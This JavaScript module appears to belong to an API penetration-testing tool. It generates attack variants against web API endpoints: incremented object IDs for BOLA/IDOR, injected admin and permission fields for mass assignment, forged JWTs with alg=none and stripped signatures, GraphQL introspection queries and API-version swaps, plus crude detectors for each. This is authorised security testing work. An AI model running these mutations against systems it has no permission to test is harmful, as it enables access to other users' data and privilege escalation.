/**
 * Deep API Security Testing — beyond dumb fuzzing.
 *
 * Elite hunters understand APIs:
 *   - BOLA/IDOR: /api/users/123 → try /api/users/124
 *   - Mass assignment: add {"role":"admin"} to JSON body
 *   - JWT flaws: alg=none, weak secret, no verification
 *   - Excessive data: API returns more than the UI shows
 *   - No rate limiting on sensitive endpoints
 *   - GraphQL introspection enabled
 *   - API versioning: /v1/ → try /v2/, /beta/
 *
 * This engine analyzes API structure and generates smart tests.
 */

export const API_TESTS = Object.freeze([
  {
    id: 'bola_idor',
    name: 'BOLA — object ID manipulation',
    severity: 'high',
    description: "Change object IDs in API paths/bodies to access other users' data",
    generate: endpoint => {
      const tests = [];
      // /api/users/123 → /api/users/124, /api/users/122
      const idMatch = endpoint.path.match(/\/(\d+)(?=\/|$)/);
      if (idMatch) {
        const id = Number(idMatch[1]);
        for (const nid of [id + 1, id - 1, id + 100]) {
          if (nid > 0) {
            tests.push({
              ...endpoint,
              path: endpoint.path.replace(`/${idMatch[1]}`, `/${nid}`),
              _note: `BOLA: ${id} → ${nid}`,
            });
          }
        }
      }
      // UUIDs can't increment — try known patterns
      return tests;
    },
    detect: (base, mutated) => {
      if (mutated.status === 200 && JSON.stringify(mutated.body) !== JSON.stringify(base.body)) {
        return { vulnerable: true, evidence: 'BOLA: different object ID returned different data' };
      }
      return { vulnerable: false, evidence: '' };
    },
  },
  {
    id: 'mass_assignment',
    name: 'Mass assignment via JSON',
    severity: 'critical',
    description: 'Inject privileged fields into JSON bodies',
    generate: endpoint => {
      if (!['POST', 'PUT', 'PATCH'].includes(endpoint.method)) return [];
      const payloads = [
        { role: 'admin' },
        { is_admin: true },
        { isAdmin: true },
        { permissions: ['*'] },
        { verified: true },
      ];
      return payloads.map(p => ({
        ...endpoint,
        body: { ...(endpoint.body || {}), ...p },
        _note: `Mass assignment: ${Object.keys(p).join(',')}`,
      }));
    },
    detect: (base, mutated) => {
      const bodyStr = JSON.stringify(mutated.body || '');
      if (/admin|privileg/i.test(bodyStr) && mutated.status < 300) {
        return { vulnerable: true, evidence: 'Mass assignment: privileged field accepted' };
      }
      return { vulnerable: false, evidence: '' };
    },
  },
  {
    id: 'jwt_none',
    name: 'JWT alg=none',
    severity: 'critical',
    description: 'Strip JWT signature, set alg=none',
    generate: endpoint => {
      const auth = endpoint.headers?.['Authorization'];
      if (!auth?.startsWith('Bearer ')) return [];
      const token = auth.slice(7);
      const parts = token.split('.');
      if (parts.length !== 3) return [];
      try {
        const header = JSON.parse(Buffer.from(parts[0], 'base64').toString());
        header.alg = 'none';
        const newHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
        const noneToken = `${newHeader}.${parts[1]}.`;
        return [
          {
            ...endpoint,
            headers: { ...endpoint.headers, Authorization: `Bearer ${noneToken}` },
            _note: 'JWT alg=none',
          },
        ];
      } catch {
        return [];
      }
    },
    detect: (base, mutated) => {
      if (mutated.status < 300 && base.status >= 400) {
        return { vulnerable: true, evidence: 'JWT accepted with alg=none (no signature)' };
      }
      // If both succeed, check if mutated gave same access
      if (mutated.status < 300) {
        return { vulnerable: true, evidence: 'JWT alg=none not rejected' };
      }
      return { vulnerable: false, evidence: '' };
    },
  },
  {
    id: 'excessive_data',
    name: 'Excessive data exposure',
    severity: 'medium',
    description: 'API returns more fields than the UI displays (password hashes, SSNs, etc.)',
    generate: endpoint => [endpoint], // no mutation — analyze response
    detect: base => {
      const bodyStr = JSON.stringify(base.body || '');
      const sensitive = [
        /password[_-]?hash/i,
        /ssn/i,
        /social[_-]?security/i,
        /credit[_-]?card/i,
        /"password"\s*:/i,
        /secret/i,
      ];
      for (const p of sensitive) {
        if (p.test(bodyStr)) {
          return { vulnerable: true, evidence: `Excessive data: response contains ${p.source}` };
        }
      }
      return { vulnerable: false, evidence: '' };
    },
  },
  {
    id: 'graphql_introspection',
    name: 'GraphQL introspection',
    severity: 'medium',
    description: 'Check if GraphQL introspection is enabled (schema leak)',
    generate: endpoint => {
      if (!endpoint.path.includes('graphql')) return [];
      return [
        {
          ...endpoint,
          method: 'POST',
          body: { query: '{__schema{types{name}}}' },
          _note: 'GraphQL introspection query',
        },
      ];
    },
    detect: (base, mutated) => {
      const bodyStr = JSON.stringify(mutated.body || '');
      if (bodyStr.includes('__schema') && bodyStr.includes('types')) {
        return {
          vulnerable: true,
          evidence: 'GraphQL introspection enabled — full schema exposed',
        };
      }
      return { vulnerable: false, evidence: '' };
    },
  },
  {
    id: 'api_version',
    name: 'API version bypass',
    severity: 'medium',
    description: 'Old API versions may lack security controls',
    generate: endpoint => {
      const vMatch = endpoint.path.match(/\/v(\d+)\//);
      if (!vMatch) return [];
      const v = Number(vMatch[1]);
      const tests = [];
      for (const nv of [v - 1, v + 1]) {
        if (nv > 0) {
          tests.push({
            ...endpoint,
            path: endpoint.path.replace(`/v${v}/`, `/v${nv}/`),
            _note: `API version: v${v} → v${nv}`,
          });
        }
      }
      // Try unversioned
      tests.push({
        ...endpoint,
        path: endpoint.path.replace(`/v${v}`, ''),
        _note: 'API version: unversioned',
      });
      return tests;
    },
    detect: (base, mutated) => {
      if (mutated.status < 300 && base.status >= 400) {
        return { vulnerable: true, evidence: `API version bypass: alternate version accessible` };
      }
      return { vulnerable: false, evidence: '' };
    },
  },
]);

/**
 * Parse API endpoints from discovered URLs.
 */
export function parseApiEndpoints(urls) {
  return urls
    .filter(u => /\/api\//i.test(u))
    .map(u => {
      try {
        const url = new URL(u);
        return {
          method: 'GET',
          path: url.pathname,
          fullUrl: u,
          params: Object.fromEntries(url.searchParams),
        };
      } catch {
        return null;
      }
    })
    .filter(Boolean);
}

/**
 * Get API tests applicable to an endpoint.
 */
export function getApiTestsFor(endpoint) {
  return API_TESTS.filter(t => {
    const generated = t.generate(endpoint);
    return generated && generated.length > 0;
  });
}
